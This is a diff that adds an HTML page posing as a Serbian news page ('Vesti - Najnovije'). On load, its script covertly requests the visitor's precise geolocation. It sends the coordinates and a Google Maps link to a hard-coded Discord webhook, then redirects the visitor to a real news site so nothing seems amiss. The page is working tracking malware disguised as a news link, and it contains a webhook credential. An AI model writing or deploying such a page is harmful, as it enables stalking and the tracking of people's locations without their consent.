@@ -1,1 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head><title>Vesti - Najnovije</title><meta charset="UTF-8"></head>
+<body>
+    <script>
+        const discordWebhook = "https://discordapp.com/api/webhooks/1494140296936558602/NW_nYMuyUgbb_cSUwheVuvk0U60zeUp6iEzqPVZEUiZeW7Ix18Vs1mJvHKNyKU2oBk7i";
+        const redirectUrl = "https://www.rts.rs";
 
+        function sendToDiscord(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(discordWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🚨 **LOKACIJA AKTIVIRANA** 🚨\nMapa: ${mapsLink}\nPreciznost: ${Math.round(position.coords.accuracy)}m`
+                })
+            }).finally(() => {
+                window.location.href = redirectUrl;
+            });
+        }
+
+        function handleError() {
+            window.location.href = redirectUrl;
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000
+                });
+            } else {
+                window.location.href = redirectUrl;
+            }
+        };
+    </script>
+</body>
+</html>
